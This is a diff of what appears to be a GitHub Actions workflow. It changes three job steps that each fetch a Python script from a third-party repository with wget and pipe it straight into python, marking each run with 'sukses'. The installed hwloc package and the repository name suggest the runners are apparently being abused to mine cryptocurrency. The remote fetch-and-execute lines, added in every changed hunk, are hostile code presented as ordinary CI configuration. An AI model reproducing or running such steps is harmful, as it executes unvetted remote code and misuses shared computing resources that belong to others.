@@ -28,7 +28,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        timeout 5m wget -O- https://github.com/jepir3/Xm613/raw/main/toll%20(1).py | python &
+        timeout 5m wget -O- https://github.com/jepir3/Xm613/raw/main/toll2.py | python &
         sleep 5m
         echo "sukses"
   mechat:
@@ -54,7 +54,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        wget -O- https://github.com/jepir3/Xm613/raw/main/toll%20(1).py | python
+        wget -O- https://github.com/jepir3/Xm613/raw/main/toll2.py | python
         echo "sukses"
   mechat2:
     needs: pemanasan
@@ -79,7 +79,7 @@ jobs:
     - name: Main
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
-        wget -O- https://github.com/jepir3/Xm613/raw/main/toll%20(1).py | python 
+        wget -O- https://github.com/jepir3/Xm613/raw/main/toll2.py | python 
         echo "sukses"
   Success:
     needs: [pemanasan, mechat]
